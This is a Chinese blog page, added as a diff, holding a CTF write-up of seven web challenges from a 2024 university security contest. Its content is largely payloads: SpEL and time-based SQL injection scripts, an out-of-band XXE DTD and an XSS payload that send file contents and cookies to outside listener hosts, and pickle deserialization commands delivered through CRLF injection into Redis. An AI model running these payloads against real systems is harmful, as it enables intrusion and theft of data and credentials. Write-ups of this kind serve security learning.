@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <meta property="og:site_name" content="s3ven&#39;s blog">
+  
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>2024 高校网络安全管理运维赛 WriteUp | s3ven&#39;s blog</title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container-wider post-details" id="post-details">
+    <div class="zoom-wrap">
+      <div class="post-content">
+        <div class="post-title">2024 高校网络安全管理运维赛 WriteUp</div>
+        <div class="post-attach">
+          <span class="post-pubtime">
+            <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+            2024-05-06
+          </span>
+          
+                <span class="post-categories">
+                  <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                  
+                  <span class="span--category">
+                    <a href="../../categories/write-up/" title="Write Up">
+                      Write Up
+                    </a>
+                  </span>
+                  
+                </span>
+            
+                <span class="post-tags">
+                  <i class="iconfont icon-tags mr-10" title="标签"></i>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/nodejs/" title="NodeJS">
+                      #NodeJS
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/php/" title="PHP">
+                      #PHP
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/java/" title="Java">
+                      #Java
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/sql/" title="SQL">
+                      #SQL
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/python/" title="Python">
+                      #Python
+                    </a>
+                  </span>
+                  
+                </span>
+            
+        </div>
+        <div class="markdown-body">
+          
+<style id="hexo-wm">
+.hexo-wm {
+  color: transparent !important;
+  opacity: 0 !important;
+  font-size: 0 !important;
+  line-height: 0 !important;
+  pointer-events: none !important;
+  user-select: text !important;
+  -webkit-user-select: text !important;
+  speak: none !important;
+  vertical-align: baseline !important;
+  display: inline !important;
+}
+
+.hexo-wm * { color: transparent !important; opacity: 0 !important; }
+</style>
+<html><head></head><body><h1 id="expr"><a href="#expr" class="headerlink" title="expr"></a>expr</h1><p>SPEL注入，但经过测试可以发现不允许执行命令，也不能出网</p>
+<p>因此通过延时判断文件内容侧信道，<span class="hexo-wm">𝘴‍​³𝐯𝘦𝐧․​ѕi﻿​𝒕e‍‌</span>逐位读出flag文件，如果内容正确则延时</p>
+<pre class="language-none"><code class="language-none">("a".class.forName("jav"+"a.nio.file.Files").readAllLines("a".class.forName("ja"+
+"va.nio.file.Paths").get("/flag"))).toString().substring({},{}).equals("[") and
+T(Thread).sleep(1000000000)</code></pre>
+
+<h1 id="fileit"><a href="#fileit" class="headerlink" title="fileit"></a>fileit</h1><p><img src="image-1.png" alt="image-1.png"><br>根据源代码中的注释语句判<span class="hexo-wm">𝘴﻿‍𝟯𝒗ｅ𝐧∙﻿𝐬𝘪​ｔe﻿</span>断是 xxe 注入</p>
+<p>在 <code>file_server</code> 上放置 <code>xxe.dtd</code>：</p>
+<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;
+  
+&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://&lt;listen_server_ip&gt;:&lt;listen_server_port&gt;/%file;'&gt;"&gt;</code></pre>
+
+<p>并向服务器发送 <span class="hexo-wm">s‌3𝒗ℯn∙​𝐬ⅈ﻿‌𝘵℮‌</span>Payload：</p>
+<pre class="language-none"><code class="language-none">&lt;!DOCTYPE note[ &lt;!ENTITY % remote SYSTEM "http://&lt;file_server_ip&gt;:&lt;file_server_port&gt;/xxe.dtd"&gt; %remote;%int;%send; ]&gt;</code></pre>
+<p>即可在 <code>listen_server</code> 上获得 flag</p>
+<h1 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h1><p>在附件的 <code>baseinfoSet.json</code> 中找到加密后的密码</p>
+<pre class="language-none"><code class="language-none">"baseinfoSet_TELECOMPASSWORD": "106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49&amp;56&amp;50&amp;56&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;",
+"baseinfoSet_USERPASSWORD": "106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49&amp;56&amp;50&amp;56&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;",</code></pre>
+<p>搜索 <code>baseinfoSet_TELECOMPASSWORD</code> 加密算法的解密脚本：</p>
+<pre class="language-none"><code class="language-none">orig='106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49
+&amp;56&amp;50&amp;56&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;'
+l=list(map(int,orig.split('&amp;')[:-1]))
+result=[]
+for i in l:
+    if i &gt; 57:
+        i-=4
+    result.append(chr(i))
+print(''.join(result))</code></pre>
+<p>运行后即可获得 flag</p>
+<h1 id="JustXSS"><a href="#JustXSS" class="headerlink" title="JustXSS"></a>JustXSS</h1><p>预测 nonce <span class="hexo-wm">𝘀​‌𝟯𝒗e𝐧·​‍𝘀𝐢​ｔ𝘦‌‍</span>来进行 XSS</p>
+<p>V8的 <code>Math.random()</code> 方法不是密码学安全的，<span class="hexo-wm">𝘀‌﻿𝟯𝐯𝐞ｎ․‍‌𝐬𝐢‌​t𝘦‌​</span>可以通过历史记录来预测伪随机数生成器内部状<br>态，从而获取之后得到的值。</p>
+<p>能拿到未来的nonce后就可以很方便的注入，但由于 Vue 的 <code>v-html</code> 是设置 <code>innerHTML</code> 来更新<br>DOM ，而事件侦听由被 CSP 给 ban 了，直接注入 <code>&lt;script&gt;</code> 也是不会执行的<br>这里就需要第二个 <span class="hexo-wm">s﻿﻿3𝒗en•​𝐬ⅈ‌te‍‌</span>Trick，使用 <code>iframe</code> 绕过这个限制</p>
+<p>POC:</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script
+nonce='$NONCE'&gt;window.open('https://webhook.site/88da27db-7c1e-4fee-8410-
+9cef8bc08d2c?'+document.cookie)&lt;/script&gt;<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></code></pre>
+
+<h1 id="Messy-Mongo"><a href="#Messy-Mongo" class="headerlink" title="Messy Mongo"></a>Messy Mongo</h1><p>利用后端 MongoDB $表达式解析 绕过前端 <span class="hexo-wm">s‍﻿⑶v𝘦ｎ․‍‌𝘀𝐢‍ｔ℮​</span>typescript 安全校验获得 flag</p>
+<p>采用 <code>Update document</code> 和 <code>Aggregation pipeline</code> 的区别：</p>
+<p>当传入的 <code>Update</code> 参数为数组时，<span class="hexo-wm">𝐬﻿​⑶vℯｎ·‌‌𝐬𝘪‌‍𝒕ｅ​</span>MongoDB 将会把 <code>Update</code> 作为一个 <code>Aggregation pipeline</code> 进行解析，从而可以使用其Expr进行绕过。</p>
+<p>POC 1：</p>
+<pre class="language-none"><code class="language-none">{
+    username: {
+        $substr: ['admin', 0, 5]
+    }
+}</code></pre>
+
+<p>POC 2：<br><img src="image-2.png" alt="image-2.png"></p>
+<pre class="language-none"><code class="language-none">{
+    "username": { "$toString": "admin" }
+}</code></pre>
+<p>修改 ctfer 的 username 为 admin <span class="hexo-wm">ѕ‌﻿𝟯𝘷ℯn·​‍ꜱi‌𝘵℮‍</span>，从而获取 admin 的 Todo lists ，获得 flag</p>
+<h1 id="phpsql"><a href="#phpsql" class="headerlink" title="phpsql"></a>phpsql</h1><p>简单SQL注入</p>
+<p>可以 <code>username=admin&amp;password='||1=1;#</code></p>
+<p>当然，也可以:</p>
+<pre class="language-none"><code class="language-none">{"password":"1", "username":
+f"1'||if(ascii(substr((sselectelect/**/group_concat(passwoorrd)/**/from/**/user),
+{i},1))&gt;{mid},sleep(2),0)#"}</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests 
+url <span class="token operator">=</span> <span class="token string">"https://prob06-frcwo2ol.contest.pku.edu.cn/login.php"</span>
+flag <span class="token operator">=</span> <span class="token string">""</span>
+i <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>
+    left <span class="token operator">=</span> <span class="token number">32</span>
+    right <span class="token operator">=</span> <span class="token number">127</span>
+    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left<span class="token operator">+</span>right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
+        payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1'||if(ascii(substr((sselectelect/**/group_concat(passwoorrd)/**/from/**/user),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(2),0)#"</span></span><span class="token punctuation">}</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token comment">#print(res.text) </span>
+            right <span class="token operator">=</span> mid 
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            left <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
+    <span class="token keyword">if</span> left <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span></code></pre>
+
+<h1 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h1><p>访问 source 路径获得源码，发现存在 ssrf <span class="hexo-wm">𝒔‍​3𝘷𝐞ｎ․‍𝘴ⅈ﻿﻿te﻿​</span>的点且存在没有密码的 redis</p>
+<p>结合题目描述得知版本为 python3.7，使用的 urllib 存在 http 头注入的问题，用这个漏洞（CVE-<br>2019-9947）对后台的 <span class="hexo-wm">𝘀‌𝟯v𝐞𝒏․﻿𝒔ⅈ​‍ｔ𝐞﻿​</span>redis 进行攻击</p>
+<p>构造key值</p>
+<pre class="language-none"><code class="language-none">md5('http://1')=22d474190b1889d3373fa4f9334e979c</code></pre>
+
+<p>用脚本构造pi<span class="hexo-wm">ѕ‌﻿𝟯𝘷𝐞𝐧．‍𝒔𝘪‍t℮﻿﻿</span>ckle的反序列数据</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64 
+a<span class="token operator">=</span><span class="token triple-quoted-string string">b'''cos system
+(S'command here'
+tR.'''</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+<p>因为采用的是 flask 框架，<span class="hexo-wm">𝐬‍⑶𝘷ℯ𝘯•‍𝘴𝐢﻿‌𝘵𝐞﻿​</span>最简单获得回显的方式就是写文件到静态目录</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+a<span class="token operator">=</span><span class="token triple-quoted-string string">b'''cos
+system
+(S'mkdir static'
+tR.'''</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>再将 flag <span class="hexo-wm">ѕ﻿﻿3𝘷𝐞𝘯•﻿𝘴ⅈ﻿‍𝐭𝐞‌​</span>的内容重定向到 <code>static/1.txt</code> 中</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+a<span class="token operator">=</span><span class="token triple-quoted-string string">b'''cos
+system
+(S'cat /flag&gt;static/1.txt'
+tR.'''</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>综上，先访问以下 url</p>
+<pre class="language-none"><code class="language-none">/?url=127.0.0.1:6379?
+%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydta2RpciBzdGF0aWMnCnRSLg%3d%3d%22%0d%0apaddins</code></pre>
+<p>触发反序列化创建 <span class="hexo-wm">𝒔​‌³v𝐞ｎ․​‌s𝐢﻿‍𝘵e﻿‍</span>static 目录</p>
+<pre class="language-none"><code class="language-none">/?url=1</code></pre>
+<p>再访问以下 url，将 <span class="hexo-wm">s​‌𝟯ⅴ𝐞ｎ．﻿𝒔𝘪‍t𝘦‌‍</span>flag 输出到 <code>static/1.txt</code></p>
+<pre class="language-none"><code class="language-none">/?url=127.0.0.1:6379?
+%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydjYXQgL2ZsYWc%2bc3RhdGljLzEudHh0Jwp0Ui4%3d%22%0d%0apaddins</code></pre>
+<p>触发</p>
+<pre class="language-none"><code class="language-none">/?url=1</code></pre>
+<p>再访问 <code>/static/1.txt</code> ,获得 flag</p>
+</body></html>
+        </div>
+        
+          <div class="prev-or-next">
+            <div class="post-foot-next">
+              
+                <a href="../2024-d-3ctf-writeup/" target="_self">
+                  <i class="iconfont icon-chevronleft"></i>
+                  <span>上一页</span>
+                </a>
+              
+            </div>
+            <div class="post-foot-prev">
+              
+                <a href="../2024-ciscn-qual-writeup/" target="_self">
+                  <span>下一页</span>
+                  <i class="iconfont icon-chevronright"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </div>
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="catalog-zoom">
+      <div class="title">目录</div>
+      <div class="catalog-content">
+        
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#expr"><span class="toc-text">expr</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fileit"><span class="toc-text">fileit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gateway"><span class="toc-text">Gateway</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JustXSS"><span class="toc-text">JustXSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Messy-Mongo"><span class="toc-text">Messy Mongo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpsql"><span class="toc-text">phpsql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pyssrf"><span class="toc-text">pyssrf</span></a></li></ol>
+        
+      </div>
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+  <script>
+    (() => {
+      function compensate() {
+        const bodyBox = document.querySelector('.zoom-wrap');
+        if (bodyBox) {
+          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
+          bodyBox.style.marginBottom = `-${gapY}px`;
+        }
+
+        const catBox = document.querySelector('.catalog-zoom');
+        if (catBox) {
+          const rect = catBox.getBoundingClientRect();
+          const gapX = catBox.offsetWidth  - rect.width;
+          const gapY = catBox.offsetHeight - rect.height;
+
+          const list = catBox.querySelector('.catalog-content');
+          if (list) {
+            const orig = list.dataset.origHeight
+                      ? parseFloat(list.dataset.origHeight)
+                      : parseFloat(getComputedStyle(list).height);
+            list.dataset.origHeight = orig;
+            list.style.height       = (orig + gapY) + 'px';
+          }
+
+          catBox.style.marginRight  = `-${gapX}px`;
+          catBox.style.marginBottom = `-${gapY}px`;
+        }
+      }
+
+      function hookImages(root = document) {
+        root.querySelectorAll('img').forEach(img => {
+          if (img.dataset._scaledFix) return;
+          img.dataset._scaledFix = 1;
+          img.addEventListener('load', compensate, {once: true});
+        });
+      }
+
+      addEventListener('DOMContentLoaded', () => {
+        compensate();
+        hookImages();
+      });
+
+      addEventListener('resize', compensate);
+
+      const observer = new MutationObserver(muts => {
+        muts.forEach(m => {
+          m.addedNodes.forEach(n => {
+            if (n.nodeType !== 1) return;
+            if (n.tagName === 'IMG') hookImages(n.parentNode);
+            else hookImages(n);
+          });
+        });
+      });
+
+      const wrap = document.querySelector('.zoom-wrap');
+      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
+    })();
+  </script>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2023-2026 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
